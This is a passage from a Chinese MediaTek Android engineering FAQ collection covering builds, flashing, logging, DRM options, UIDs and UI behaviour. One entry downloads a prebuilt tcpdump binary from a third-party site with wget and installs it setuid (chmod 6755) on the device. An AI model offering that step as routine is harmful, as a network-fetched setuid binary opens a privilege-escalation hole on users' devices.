因为Monkey Test过程是随机的发出事件流，有几种可能产生自动关机的情况：通过发送broadcast去调用到关机，模拟powerkey关机，调用setting里面的恢复出厂设置关机等等，这几种发生自动关机的情况都是正常的，但是实际上Monkey Test即使走到关机流程也应该直接return，以保证Monkey Test的其它操作都可以正常进行。

因此如果发生自动关机，请首先check下面几个注意事项，确保Monkey Test的测试条件是正确的：
1. Monkey Test的版本是否是Eng Build?
2. 如果Monkey test没有用我司的脚本，请在Monkey Test之前务必先设置属性:
adb shell setprop ro.monkey true
然后再重新安排Monkey Test测试，如果还有发生自动关机，请务必提供相应的mobilelog。
```

## [battery]  [FAQ02496]  MT6573 Android 拔掉电池开机时间拉长问题

```text
Android 采用yaffs2 文件系统， 基于yaffs 的checkpoint 原因，当开机时无法找到checkpoint, 就会scan 对应的patition, 这个时间决定于patition的大小，和文件的数量，从而拉长开机的时间。
当有应用程序在写文件之前，kernel会将checkpoint删除掉，然后在将数据写到flash中，如果这时断电，下次开机的时候就会找不到checkpoint从而scan整个分区，这时yaffs的设计，避免断电导致 checkpoint与分区的具体使用情况不一致。
如果开机不去checkpoint， 有可能会导致整个分区的文件丢失或者文件大小，或者分区的使用情况
```

## [tool]  [FAQ03652]  [FlashTool] flashtool的format whole flash和MDT format and download all的区别

```text
对nand flash, 因为有bad block, 两者的行为会有所差异.
对emmc则是无差别的.
 
[Solution] 
flashtool的format whole flash, 默认是做logical format,
start address为0x0, length为0x1f5c0000
MDT的format and download all则是做physical format,
start address：0x0, length为0x20000000
 
flashtool和MDT的firmware upgrade均会做format, 并且都是physical format, start address:0x0, length为0x20000000
```

## [tool]  [FAQ01922]  [ATE]  Database 在软件中的路径

```text
如果是 6573平台:
Modem 的 database path: Alps\mediatek\custom\common\modem\projectname\BPLGUInfoCustomApp_XXX
AP 的 database path: Alps\mediatek\source\cgen\APDB_xxxx  (文件后缀不带 _ENUM 的)

如果是 6516 平台，
MD database路径:Alps\mtk\custom\src\csutom\common\modem\BPLGUInfoCustomApp
AP 的 database 路径为：Alps\mtk\src\cgen\APDB_xxx
```

## [tool]  [FAQ03465]  [FlashTool] 按键下载与不按键下载的区别

```text
下载可分为按键下载和不按键下载,flashtool可自动识别这两种方式，MDT需要手动切换.
什么情况下可以不按键下载?
产线使用MDT如何进行切换?
 
[Solution] 
1 如果空板第一次下载，不用按键. PC端设备管理器中枚举的端口为mtk usb port.
2 如果下载过preloader, 75/77可以不按键下载，直接插usb线. PC枚举出的端口为preloader usb port
3 MDT默认是bootrom -> da, 即空板不按键下载，或者按kcol0下载.
如果产线升级不使用夹具, MDT的download type为firmware upgrade,  usb port的选项需要切换到preloader ->DA
```

## [FAQ04654]  如何修改UART输出数据的波特率

```text
有以下3个地方分别控制不同的部分的波特率
1.  设置  preloader  波特率，这里不会设置到uboot和kernel
文件为mediatek/custom/proj/preloader/inc/cus_bldr.h
#define CFG_LOG_BAUDRATE  (115200)

2.   修改uboot 波特率
mediatek/custom/proj/uboot/inc/configs/ubconfigs.h
#define CFG_LOG_BAUDRATE  (115200)

3.  修改kernel 波特率
mediatek/config/mt6575/autoconfig/kconfig/platform
CONFIG_CMDLINE="console=ttyMt3, 115200"
```

## [FAQ04689]  Mediatek 释放版本信息

```text
MTK 的版本信息一般包括MTK_BRANCH， MTK_BUILD_VERNO， MTK_WEEK_NO 这些参数存储在alps/mediatek/config/common/ProjectConfig.mk 中。在编译时会将这些信息转换成system property 存放在
system/build.prop 文件中，download 到手机后您可以通过:
adb getprop ro.mediatek.version.branch
adb getprop ro.mediatek.version.release
来查看
```

## [ota]  [FAQ04813]  update.zip包中各个文件的含义

```text
将全量升级包update.zip包解压后里面的各个文件的含义如下： 
boot.img:(boot.img=kernel+ramdisk) 
system:(升级后会放在系统的system分区。主要用来更新系统的一些应用或则应用会用到的一些库) 
recovery/recovery-from-boot.p:(是boot.img和recovery.img的补丁) 
recovery/etc/install-recovery.sh:(install-recovery.sh是更新脚本) 
META-INF/CERT.RSA:(签名文件相关,保存公匙和加密算法) 
META-INF/CERT.SF:(签名文件相关,保存私匙,CERT代表签名者) 
META-INF/MAINFEST.MF:(这个manifest文件定义了与包的组成结构相关的数据) 
com/google/android/update-binary:(一个脚本解释器，能够识别updater-script中描述的操作) 
com/google/android/updater-script:(脚本文件，具体描述了更新过程)
com/google/android/metadata:(描述设备信息及环境变量的元数据)
```

## [FAQ04879]  MTK_LCA_SUPPORT=yes的版本不能开机

```text
如果之前拿过手机download 过非LCA 版本的软体，因为LCA 版本和LCA 版本的image 分布不一样，特别是nvram 分布。
//LCA=NO
DSP_BL 0x40000
{

}

__NODL_NVRAM 0x100000
{

}

__NODL_SECCFG 0x600000
{

}

//LCA = YES
DSP_BL 0x40000
{

}

__NODL_NVRAM 0x1c0000
{

}

__NODL_SECCFG 0x4c0000
{

}

flash tool firmware upgrade 不会擦掉NVRAM 数据，导致lk 的image 和原本的nvram 冲突，才导致preloader 验证lk magic code 时fail.

因此需要全部format 一次后，才可以正常开机。
```

## [FAQ04979]  如何修改DVM虚拟机可用Heap大小的上限?

```text
a.       对于ICS、ICS2和JB的平台，可以根据以下情况修改：

1.    若是希望修改成为出厂时的默认配置，可以找到build/tools/buildinfo.sh文件，在里面找到如下内容：
echo “dalvik.vm.heapsize=128M”
在此句的后面添加：
echo “dalvik.vm.heapgrowthlimit=64M”

其中64M为Heap增长所能达到的最大值。这个值可以根据需要设定，但是不能超过heapsize的大小，即不能超过上面的128M。此修改会在编译后生效，当编译生成的系统，烧到手机上后，默认的Heap增长的的上限就成为64M。即一个进程所能占用的最大空间不会超过64M。

2.    若不需要量产，只希望修改某一台手机，可以采用如下的办法：
adb pull /system/build.prop C:\build.prop
用文本编辑器打开build.prop找到dalvik.vm.heapsize=128m,在其后面添加dalvik.vm.heapgrowthlimit=64m(若已经有此句，则只需要修改为64m即可)。
然后通过adb push build.prop /system
最后重启手机生效。

b.       对于GB平台只需要按照上述方法修改dalvik.vm.heapsize即可。
```

## [CMD]  [FAQ05088]  如何通过命令行的方式抓取tcpdump

```text
下载 tcpdump : wget https://www.androidtcpdump.com/download/4.9.2.1.9.0/tcpdump
如果要抓TCP数据包，我们可以使用TCPdump工具，类似于windows/linux下使用的这个工具一样。先下载tcpdump工具。

你需要root权限，
adb remount
adb push  tcpdump  /data/local/tcpdump
adb shell  chmod  6755  /data/local/tcpdump

抓包很简单
adb shell tcpdump   -w  /sdcard/capture.pcap

以下为其他参数：
# "-p": disable promiscuous mode (doesn't work anyway)
# "-s 0": capture the entire packet
# "-w": write packets to a file (rather than printing to stdout)
   ... do whatever you want to capture, then ^C to stop it ...

导出
adb pull /sdcard/capture.pcap
```

## [FAQ05127]  如何修改wifi重连次数

```text
在SupplicantStateTracker.java文件中
修改MAX_RETRIES_ON_AUTHENTICATION_FAILURE的值。
```

## [FAQ05162]  [Factory mode]  怎么配置工厂模式测试项?

```text
alps/mediatek/custom/$proj/factory/factory.ini 可以定制Factory mode测试项，如：
MenuItem=M-Sensor;
MenuItem=ALS/PS;
Factory mode启动后，会先后寻找 /sdcard/factory.ini,/etc/factory.ini文件，所以可以复制factory.ini文件到SD卡，并修改其中的内容来配置测试项. 若找不到ini文件，则使用factory.c中的默认配置
▪      Related code all in alps/mediatek/factory/src/factory.c:
▪      Golbal test items array:
static item_t ftm_cust_items[ITEM_MAX_IDS] ; // factory.ini settings
static item_t ftm_cust_auto_items[ITEM_MAX_IDS] ;// factory.ini settings
static item_t ftm_test_items[]  // Default settings
static item_t ftm_auto_test_items[]   // Default settings
ftm_test_items &&  ftm_auto_test_items controled by MACROS
    (ie. FEATURE_FTM_KEYS/CUSTOM_KERNEL_ALSPS...)
▪      In main:
   read_config(/sdcard/factory.ini or /etc/factory.ini)
         ftm_cust_items = Items in (factory.ini && ftm_test_items)
         ftm_cust_auto_items = Items in (factory.ini &&  ftm_test_items &&  ftm_auto_test_items)
```

## [FAQ04380]  [Vibrator]  如何定制vibrator的各种震动模式

```text
一般振动时间的配置在如下文件：

frameworks/base/core/res/res/values/config.xml
<!-- 长按振动 -->
<!-- Vibrator pattern for feedback about a long screen/key press -->
<integer-array name="config_longPressVibePattern">
    <item>0</item>
    <item>1</item>
    <item>20</item>
    <item>21</item>
</integer-array>

<!-- 虚拟按键振动 -->
<!-- Vibrator pattern for feedback about touching a virtual key -->
<integer-array name="config_virtualKeyVibePattern">
    <item>0</item>
    <item>10</item>
    <item>20</item>
    <item>30</item>
</integer-array>

<!-- 软键盘按键振动 -->
<!-- Vibrator pattern for a very short but reliable vibration for soft keyboard tap -->
<integer-array name="config_keyboardTapVibePattern">
    <item>40</item>
</integer-array>

<!-- 非安全模式启动振动 -->
<!-- Vibrator pattern for feedback about booting with safe mode disabled -->
<integer-array name="config_safeModeDisabledVibePattern">
    <item>0</item>
    <item>1</item>
    <item>20</item>
    <item>21</item>
</integer-array>

<!-- 安全模式启动振动 -->
<!-- Vibrator pattern for feedback about booting with safe mode disabled -->
<integer-array name="config_safeModeEnabledVibePattern">
    <item>0</item>
    <item>1</item>
    <item>20</item>
    <item>21</item>
    <item>500</item>
    <item>600</item>
</integer-array>

上面以数组形式的表示的，奇数位置表示暂停时间，偶数位置表示振动时间，单位为 ms
```

## [ota]  [FAQ05443]  [Recovery] 从data区读取状态来确定升级用内外置卡导致升级不成功

```text
升级包有可能会被选择下载到内置卡或外置卡上，而从recovery mode升级时有个自动下载的选项，如果选择存储卡的设置出错，会导致升级不成功。

[客户方solution] 
从/data/区域的文件中获知flag，来判断此时升级用的是内置卡还是外置卡。

[客户方risk] 
从/data/区域的文件中获知flag ，这种方式涉及到权限问题。对加密过的/data/区，recovery mode下无法访问。加密方式可以通过settings-> phone encrypt设置，也就是说可以由end user设置加密，如果在用户手中设置了加密，normal mode下有界面可以输入密码访问，但是recovery mode下无法做出类似界面，就会导致下一次升级不成功。

[MTK提供的solution] 
若有客户需要在recovery mode下同时支持内外置卡，需要在打ALPS00392239的patch之后，并修改bootable/recovery/Android.mk新增-DSUPPORT_SDCARD2，重新new即可。
ifeq ($(WITH_BACKUP_RESTORE),true)
    LOCAL_CFLAGS += -DSUPPORT_DATA_BACKUP_RESTORE -DSUPPORT_SDCARD2
endif

recovery mode就会多出/sdcard2供使用(default为外卡)。
PS：MP branch目前只有上ICS2.MP和JB.MP
```

## [FAQ06720]  [Vibrator] 开机震动在哪调用的，怎样关闭?

```text
frameworks/base/policy/src/com/android/internal/policy/impl/PhoneWindowManager.java

public boolean performHapticFeedbackLw(WindowState win, int effectId, boolean always) {
.... ...
        case HapticFeedbackConstants.SAFE_MODE_DISABLED:
            return ; //正常模式启动， 如果不想震动， 直接return;
            pattern = mSafeModeDisabledVibePattern;
            break;
        case HapticFeedbackConstants.SAFE_MODE_ENABLED:
            return ; //安全模式启动， 如果不想震动， 直接return;
            pattern = mSafeModeEnabledVibePattern;
            break;
        default:
            return false;
    }
}
```

## [CMD]  [FAQ06717]  [General]  如何快速搜索、定位ALPS代码目录中的文件?

```text
在alps目录中， 执行如下命令可以获得额外的 shell命令，
source build/envsetup.sh
比较常用的一个功能是： godir

第一次执行此命令时会在alps创建名为filelist的索引文件， 需要花费一点时间，后面执行此命令会非常快。 请试下如下命令列出GPIO 相关的目录：
godir gpio

如下命令会在所有的C/C++文件中搜索gpio_set_output_value字符串
cgrep gpio_set_output_value

类似的jgrep是查找本地所有java文件，例如：
godir PhoneWindow.java

resgrep是查找本地所有资源文件res/*.xml

croot命令 :改变到ALPS顶层目录
```

## [CMD]  [FAQ06721]  [UART]  如何通过串口进入敲 shell 命令?

```text
Uart Tx Rx 在DCT中分别配制成  UTXD URXD模式。

Tx Rx 通过串口线和PC连接。确认Uart 能吐 log，此时PC串口软件（如超级终端）中敲回车，会出现输入提示符，可以敲 shell 命令了。

如不能输入， 请检查如下命令的输出：
1.  adb shell cat /proc/cmdline 可以看到Uart 输入输出的端口。
2.  adb shell cat /init.rc 确认有如下内容：
service console /system/bin/sh
    class core
    console
    disabled
    user root
    group log

on property:ro.debuggable=1
    start console

3. adb shell getprop ro.debuggable
    确认其值为 1

若上述都正确，请提供上述输出，并抓取板上 Tx Rx 的波形图，附在eService上供后续分析。
```

## [FAQ06711]  [modem]  如何修改、更新modem?

```text
所有类型的modem都放在./mediatek/custom/common/modem/ 目录下

可以在ProjectConfig.mk下修改modem的类型:
alps/mediatek/config/$YOUR_PROJECT/ProjectConfig.mk
CUSTOM_MODEM=YOUR_MODEM

执行如下编译命令，
./mk update-modem
这个命令会依次做如下步骤
1. custgen
2. check modem
3. sign modem
4. update modem

完成后重新烧写 System image
```

## [UA]  [FAQ04656]  如何修改Android自带浏览器的User Agent

```text
Android自带浏览器的User Agent是Android这个代理，但是访问一些特殊网页，排版等布局不正常，可能其他浏览器正常，这是因为其他浏览器是用的其他代理，目前来说有Android、Destop、iphone、ipad、Froyo-N1、Honeycomb-Xoom等代理，这个可以从UI或Code去作修改。

[SOLUTION] 
一、UI修改UA
进入手机端浏览器界面，在地址栏输入about:debug(注意冒号是英文的冒号)后，触摸输入法键盘的回车键
再触摸Menu按钮，调出选项菜单，进入设置界面，在设置菜单下有一个调试菜单，触摸“调试”，再点击UAstring，换一个UA登录。

二、Code修改UA
在Browser的代码BrowserSettings.java里有设置UserAgent的位置，可以修改。

Note：
当然UA如果是operator定制的，一般是不能改的。
```

## [FAQ08166]  [Legacy Wi-Fi]  factory mode 中怎样使wifi自动连接指定AP

```text
假设当前您的手机处于factory mode ，测试wifi功能时想要手机自动连接SSID名为tp-link的AP
将alps\mediatek\custom\[project] \factory\factory.ini 中的

WIFI.SSID=mtkguest
改为WIFI.SSID=tp-link
```

## [知识点]  [FAQ04081]  TTY功能简介

```text
TTY这个功能是专为有听说障碍的残障人士使用的电传打字机(TTY) 功能，这项功能可以让听障人士使用现有的电话基础设施（包括行动电话）进行沟通。
这个功能是Google在Android 2.3中引入的功能，MTK目前对于这一功能保持Google的设计，基本没有做修改。
这个功能的测试需要有特殊的TTY外接设备以及当地运营商网络的支持，目前世界上北美地区的运营商网络（例如美国、墨西哥等）支持这个功能。若是手机项目市场没有在上述国家和地区，也可以考虑将这个功能关闭。开关的方式是在对用工程下面的ProjectConfig.mk文件中设置MTK_TTY_SUPPORT。

注意：TTY与VT有冲突，不能同时打开，即MTK_TTY_SUPPORT与MTK_3G324M_SUPPORT不能同时为yes
```

## [MMS]  [FAQ08070]  支持彩信发送报告提示

```text
请在PushReceiver.java 中，当接收到MESSAGE_TYPE_DELIVERY_IND 时，从Pdu中获取联系人号码，并新建一个thread 去show，具体修改参考如下（GB3的代码为例，其他平台也是类似的）：
在PushReceiver.java 中导入：
import com.google.android.mms.pdu.EncodedStringValue;
import andriod.widget.Toast;
import android.os.Handler;

将doInBackground(Intent... intents) 方法修改如下：

try {
    switch (type) {
        case MESSAGE_TYPE_DELIVERY_IND:
            Xlog.d(MmsApp.TXN_TAG, "type=MESSAGE_TYPE_DELIVERY_IND");
        case MESSAGE_TYPE_READ_ORIG_IND: {
            Xlog.d(MmsApp.TXN_TAG, "type=MESSAGE_TYPE_READ_ORIG_IND");
            threadId = findThreadId(mContext, pdu, type);
            if (threadId == -1) {
                // The associated SendReq isn't found, therefore skip
                // processing this PDU.
                break;
            }

            Uri uri = p.persist(pdu, Inbox.CONTENT_URI);
            // Update thread ID for ReadOrigInd & DeliveryInd.
            ContentValues values = new ContentValues(1);
            values.put(Mms.THREAD_ID, threadId);
            SqliteWrapper.update(mContext, cr, uri, values, null, null);

        if(type==MESSAGE_TYPE_DELIVERY_IND){
        Xlog.d (MmsApp.TXN_TAG, "MTK show delivery toast");
            //MessagingNotification.blockingUpdateNewMessageIndicator(PushReceiver.this, false, true);
        final long timeMillis = 3000;
      //String address = pdu.getFrom().getString();
       String getTo = (EncodedStringValue.concat(((DeliveryInd)pdu).getTo()));
       Xlog.d (MmsApp.TXN_TAG, "MTK type=MESSAGE_TYPE_DELIVERY_IND sendTo=" + getTo);
       final String message1 = mContext.getString(R.string.delivery_toast_body,getTo) ;
        mToastHandler.post(new Runnable() {
                 public void run() {
                 Toast.makeText(mContext, message1, (int)timeMillis).show();
                }
            });
       //Toast.makeText(this, message1, (int)timeMIllis).show;

            }
            break;
        }
```

## [FAQ07476]  如何添加一个固定的shared uid

```text
系统中已经定义了大量的系统UID ，如在system/core/include/private/android_filesystem_config.h 中的定义AID_SYSTEM, AID_ROOT 等
(1). 在android_filesystem_config.h 中,  对应的ID 不能够重复 "XXXX" 即您自己要添加的UID 的名字
#define  AID_XXXX          10KK  /* dhcp client */

(2). 在android_id_info android_ids 中定义具体的uid 的名称
{ "XXXXX",    AID_XXXX, },

(3). 在alps/frameworks/base/service/java/……/PackageManagerService.java 中添加
public PackageManagerService(Context context, Installer installer, boolean factoryTest, boolean onlyCore) {
的初始化中添加一行：
mSettings.addSharedUserLPw("android.uid.system", Process.SYSTEM_UID, ApplicationInfo.FLAG_SYSTEM);
mSettings.addSharedUserLPw("android.uid.phone", RADIO_UID, ApplicationInfo.FLAG_SYSTEM);
mSettings.addSharedUserLPw("android.uid.log", LOG_UID, ApplicationInfo.FLAG_SYSTEM);
mSettings.addSharedUserLPw("android.uid.nfc", NFC_UID, ApplicationInfo.FLAG_SYSTEM);
mSettings.addSharedUserLPw("android.uid.bluetooth", BLUETOOTH_UID, ApplicationInfo.FLAG_SYSTEM);
// add begin
mSettings.addSharedUserLPw("android.uid.xxxx ", XXXX_UID, ApplicationInfo.FLAG_SYSTEM);
// add end

同时在PackageManagerService.java 中定义
private static final int XXXX_UID = Process.XXXX_UID;

(4). 在frameworks/base/core/java/android/os/Process.java 中定义这个XXXX_UID 的值和android_filesystem_config.h 定义的值完全相等。
这样就可以在APP 中使用这个uid 了。具体如何使用，您可以参考如Settings app, 以及 Phone app 的AndroidManifest.xml 的写法. 
```

## [FAQ07636]  如何让NFC在开机时默认关闭

```text
将alps/packages/apps/Nfc/src/com/android/nfc/NfcService.java文件中的
static final boolean NFC_ON_DEFAULT = true;
改为
static final boolean NFC_ON_DEFAULT = false;
即可
```

## [知识点]  [BT]  [FAQ07877]  WFD(WiFi Display)和蓝牙为何不能同时打开

```text
this is MTK design limitation。
Due to BT and WiFi share the same RF antenna, 
enabling BT(it will trigger BT search device) will effect WFD streaming
Use alarm dialog to notify user WFD/BT excluded
```

## [知识点]  [FAQ03425]  “ 设置>安全>设置管理器 “ 功能是做什么的?

```text
1、 Android SDK提供了一个可管理和操作设备的API叫DevicePolicyManager，使用这个API你可以接管手机的管理权限，对手机做出系统操作，比如清除所有数据、更改屏幕解锁密码、设置密码规则、监视屏幕解锁尝试次数、锁定屏幕等操作。

如何使用DevicePolicyManager：
(1) 首先，要想调用DevicePolicyManager，必须先要注册admin权限，有了admin权限，才可能对系统进行上述功能的操作。
(2) 其次，程序在启动激活的时候，会给用户相应提示，只有当用户点击“激活”后，自己定义的代码才能真正的运转。

2、安装自定义的设备管理器后，在设置>安全>设备管理器中看到自定义的设备管理器，可以激活此设备管理器，让自定义的设备管理器执行定义的系统操作。
开发设备管理器示例：
示例图：

代码：
(1) app中定义一个类继承DeviceAdminReceiver ，用来监听权限的变化。
(2) 在Manifest.xml中定义
(3) xml/device_admin.xml代码
```

## [FAQ04297]  如何确认一个应用程序的安装位置

```text
Google 默认 PackageManager 管理安装包的机制如下 (按照优先级由高到低描述，如果高优先级的条件被满足, 则不继续参考较低优先级的选项)：

1.安装应用到SD卡，需要指定install flag: adb install -s      ***.apk
该设置拥有最高优先级，最终安装结果以这个为准，不管下面2个的配置.

2.若没有特别指定1中的install flag,将会检查 AndroidManifest.xml中android:installLocation的定义。
manifest的設定細分為：
android:installLocation = "auto"，表示先查看手机内存是否足够，如果够就安装在手机内存上，不够就安装在 T 卡上；
android:installLocation = "internalOnly"，表示安装在手机内存上；
android:installLocation = "preferExternal" ，表示安装在 T 卡上；

3.若AndroidManifest.xml中没有定义installLocation，则参考“设置”-“存储”-“首选安装位置”
首选安装位置会有3个选项：由系统决定，手机内存，手机存储。

注意：“首选安装位置”默认是关闭的，我们也不建议开启。因为有些应用google默认是要安装在手机内存中，若因为这个“首选安装位置”将应用安装到sd卡上，可能会导致cts测试失败。
```

## [FAQ06599]  eng版本，同时长按上下音量键手机重启问题

```text
1. eng版本，同时长按vol up + down(> 15 sec)，MTK当前设计会触发KDB（linux内核调试器），此时可通过UART从command line下指令debug，如果2分钟内没有任何输入，系统就会主动触发kernel panic，进而重启。kernel log会印出如下信息：
         KDB force kernel panic
2. user版本，不会存在这个问题，因此，对于最终用户没有影响。
 
**注: KDB的使用可以参考《Debugger_User Guide_xxxx_yy》，其中xxxx表示平台（如MT6577），yy表示android版本（如4.1），相关客户文档可以在http://dcc.mediatek.com下载。
```

## [FAQ08998]  MTK DRM 常见问题介绍

```text
主要介绍MTK支持的DRM Widevine Level; WV与DRM feature option的开关;play movies play videos popups couldn't fetch license (error 43)
[SOLUTION] 
一、DRM 基本信息：
1.       MTK DRM support Level：
OMA DRM V1.0
Widevine L3.
2.       OMA DRM support MIME format：
a.       DRM content MIME:
    application/vnd.oma.drm.content ---- .dcf
    application/vnd.oma.drm.message ---- .dm
b.       权限文件的MIME:
    application/vnd.oma.drm.rights+wbxml ---- .drc
    application/vnd.oma.drm.rights+xml ----- .dr
c.       MTK支持的非DRM protected的Image/Audio/Video格式，DRM就支持此media格式。DRM只是做了权限控制而已，DRM能支持的media格式就是Decoder能支持的格式。
3.       OMA DRM support types：
Default support ForwardLock, Combined Delivery, Seperate Delivery, ForwardLock_SeperateDelivery Total 4 types.
二、WV与OMA的feature option
Please follow the description section 2.3 below:
 
1 Introduction
Currently on JB SW packages, we've got 2 DRM features supported: OMA DRM v1.0 and Widevine DRM Level 3. By default these 2 DRM features are enabled.
This document describes how to disable these 2 features separately, or both.
 
2 Steps
2.1 Disable Widevine DRM Level 3 but keep OMA DRM v1.0 enabled
>> Define "MTK_WVDRM_SUPPORT=no" in your source file:
[alps/mediatek/config/$project/ProjectConfig.mk] 
This overrides the default value.
>> Fully remake your software codebase.
2.2 Disable both Widevine DRM Level 3 and OMA DRM v1.0
>> Define "MTK_WVDRM_SUPPORT=no" and "MTK_DRM_APP=no" in your source file:
[alps/mediatek/config/$project/ProjectConfig.mk] 
This overrides the default value.
>> Fully remake your software codebase.

2.3 Disable OMA DRM v1.0 but keep Widevine DRM Level 3 enabled
>> Define "MTK_DRM_APP=no" in your source file:
[alps/mediatek/config/$project/ProjectConfig.mk] 
This overrides the default value.
>> Find the source file:
[alps/packages/providers/DrmProvider/src/com/android/providers/drm/BootCompletedReceiver.java] 
In the overridden method "public void onReceive(...)", you shall find an "if (FeatureOption.MTK_DRM_APP) {...}" judgment part. Remove the "if" judgment so that those code can be executed at boot-up time.
>> You also need to make sure some utility libraries are installed on device.
Find the source file:
[alps/build/target/product/common.mk] 
You shall then find the following part:
----------------------------------------------------------------------------
  ifeq ($(strip $(MTK_DRM_APP)),yes)
    PRODUCT_PACKAGES += \
      libdrmmtkplugin \
      drm_chmod \
      libdcfdecoderjni
  endif
----------------------------------------------------------------------------
Modify it as below to make sure "libdrmmtkplugin" & "libdrmmtkutil.so" is installed on device when "MTK_DRM_APP" is disabled.
----------------------------------------------------------------------------
PRODUCT_PACKAGES += libdrmmtkplugin
  ifeq ($(strip $(MTK_DRM_APP)),yes)
    PRODUCT_PACKAGES += \
      drm_chmod \
      libdcfdecoderjni
  endif
----------------------------------------------------------------------------
>> Fully remake your software codebase.
 
三、打开FL_ONLY的方法
You'll need to add "PRODUCT_PROPERTY_OVERRIDES" definition in order to set system property which enables "Forward-lock-only".
For example, you may modify the file: alps/build/target/product/common.mk
And add the following, which add the system property [drm.forwardlock.only] , and set its value:
 
ifeq ($(strip $(MTK_DRM_APP)),yes)
  PRODUCT_PROPERTY_OVERRIDES += \
    drm.forwardlock.only=true
endif
 
Then it will disable the support for CD/SD of OMA DRM v1.0 feature.
 
四、OMA drm 测试网址
http://202.108.92.230

五、DRM专利问题
OMA不涉及到什么权限专利的问题, widevine见下面一点。

六、Widevine白名单问题
Widevine如果是要播google play store上的视频，需要加入google白名单，与google签协议。
log中有couldn't fetch license (error 43)的字样，表示是此问题。
以下引用Google早前答复的内容：

“...the devices must be offcially approved in order to be whitelisted and, therefore, be able to access the production WV contents. ...(one of the OEM) is our partner and they are not supposed to have Google Play in the first place. Please let them know they cannot use Google Play without license.”
```

## [FAQ09336]  获取data区剩余空间的API

```text
import android.os.StatFs;

import android.os.Environment;

final StatFs internalStats = new StatFs(Environment.getDataDirectory().getPath());

final long availInternalSize = (long) internalStats.getAvailableBlocks() * (long) internalStats.getBlockSize();

上面availInternalSize就是data区的剩余空间。
```

## [log]  [FAQ09330]  How to catch early kernel log in mobilelog

```text
Because of the printk buffer size restrict, some early printk log is flushed away, so we usually can't see early printk log in mobilelog(kernel_log.boot).
 
We can modify the code to increase the buffer size to catch those early log:
 
alps/kernel/kernel/printk.c
#define __LOG_BUF_LEN (1 << CONFIG_LOG_BUF_SHIFT)
====>  Let buffer size x 32
#define __LOG_BUF_LEN (1 << CONFIG_LOG_BUF_SHIFT << 5)
 
Caution:  Only apply this code change in debug time!
```

## [FAQ08536]  android 如何获取与设置process 的uid

```text
linux 中uid 包括
uid: real UID of the task
suid: saved UID of the task
euid: effective UID of the task
fsuid: UID for VFS ops

Kernel 层: cred.h 中有相关的API 常用的有task_uid(task) ;  current_uid();
Native 层：unistd.h 中getuid/setuid/getresuid/setresuid 等system call
Java 层： android.os.Process 类中提供了相关的方法：自身的uid myuid();  根据pid 查询: getUidForPid(); 设置uid: setUid();

命令操作: adb shell ps 第一列就是对应的uid, 完整的资讯可以通过 adb shell cat proc/[PID] status 获取，如:
1|root@android:/system/bin # cat /proc/6699/status
cat /proc/6699/status
Name:   ek.atci.service
State:  S (sleeping)
Tgid:   6699
Pid:    6699
PPid:   5301
TracerPid:      0
Uid:    1000    1000    1000    1000
Gid:    1000    1000    1000    1000
FDSize: 256
Groups: 1015 1028 3001 3002 3003 3005 3006
```

## [prop]  [FAQ08161]  Android SDK 中找不到android.os.SystemProperties 类

```text
System Properties 作为系统的的关键属性，涉及到系统的一些机密信息，Google 不希望普通的APP 读取这些机密信息。
于是Google 将android.os.SystemProperties 标注成hidden API, 那么就不会包含在android SDK 的android.jar 当中，从而无法直接引用。
 
修正方法:
在SDK 目录： SDK_DIR/platforms/android-xx/data 下面有一个layoutlib.jar， 可以引用这个java lib, 里面有包含android.os.SystemProperties
这个class, 注意的是，需要确认在eclipse 里面的Java Build Path -> Order and Export 里面 不 选中这个lib, 否则最后export apk 时，会直接将这个lib 
打包到APK 当中，一方面可能和手机本身的API 不兼容，另外一方面增大了APK 包。 

[相关FAQ] 
FAQ04349: 不能添加system property, 提示： permission denied uid:xxxxx  name:xxxxx
FAQ03994: system property 写入/更新后，马上读取无效问题
FAQ03778: 如何对system property 进行扩容 
FAQ06739: system property 设置失败的可能性分析和初步诊断
```

## [log]  [FAQ09104]  进入应用界面后发现会闪屏，此时要如何定位是否是relaunch activity引起的闪屏呢?

```text
1 对于这类问题，抓取log时记得要打开AMS的log开关：
adb shell dumpsys activity log a on
2 请在main log里搜索Relaunching关键字，看下这个Activity是否有被Relaunching，如果是，那么闪屏就是这个原因了。
3 确定是Relaunching造成的问题后，要如何进一步定位问题呢?
AMS会relaunching activity的原因是：
config发生变化，而activity没有监听对应的config，AMS就会relaunch这个activity，现象上来讲就是屏幕会闪。
我们可以从log里查看下是哪些config发生了变化，然后请app端监听这个config ，重写onConfiguartionChanged这个函数来处理config的变化。那么AMS就不会去relaunch这个activity了。
Apk监听config的方法为：
在apk的androidManifest.xml里设定
<android:configChanges=“layout_direction|locale|….”>
对于检查是哪些config发生变化，可以看main log。
举例：
V ActivityManager: Checking to restart yuku.perekammp3.ac.DaftarActivity: changed=0x2004, handles=0x4a4, newConfig={1.0 460mcc2mnc zh_CN ldltr sw320dp w320dp h508dp 240dpi nrml long port finger -keyb/v/h dpad/v skin=/system/framework/framework-res.apk s.11}
请注意红色字体：changed=0x2004
这个changed的值可以在ActivityInfo.java中查询，具体是CONFIG_开头的值。表示的含义就是当前这些config发生了变化。
比如0x2004就是CONFIG_LOCALE|CONFIG_LAYOUT_DIRECTION
注：
1        apk可以监听的config，请查询google的说明文档或者configuration class里的定义
Google的说明文档：
http://developer.android.com/guide/topics/manifest/activity-element.html
2 闪屏有很多原因，这里描述的只是一种。即AMS Relaunch Activity造成的闪屏。
```

## [FAQ09105]  开发人员选项中设置不容许后台进程,进入音乐等退出后此进程依然在后台运行

```text
1 这是google的设计，对比机现象一致
2 原因是不保留后台进程，只针对adj大于9的process
若process带有service，adj会小于等于9，所以您进入音乐后退出，音乐在后台依然会运行。
```

## [FAQ09373]  互动屏保时点击屏幕，会直接解锁进入主菜单

```text
因为互动屏保显示时，在DreamService.java的attach方法中，会添加FLAG_DISMISS_KEYGUARD。这个flag会引起PhoneWindowManager.java的finishPostLayoutPolicyLw方法去呼叫KeyguardViewMediator的keyguardDone方法解锁。
 
如果不想在互动屏保显示时解锁，请去掉这个flag即可。但是建议维持google default design。
```

## [FAQ08993]  DialerSearch不能搜索含”.”号的联系

```text
1.       新建联系人， 点击姓名后的下拉选项，将”abc.efg ”设置为名字
2.       输入号码，保存
3.       进入dialer拨号 334 (efg), 不能搜索出abc.efg这一联系人
[SOLUTION] 
在"ContactsDatabaseHelper.java"的方法"setNameForDialerSearch() "开始部分添加如下code：
-----------------------------------------------------------------------------------
if (displayNamePrimary != null) {
    displayNamePrimary = displayNamePrimary.replace('.', ' ');
}
if (displayNameAlternative != null) {
    displayNameAlternative = displayNameAlternative.replace('.', ' ');
}
------------------------------------------------------------------------------------------------
```

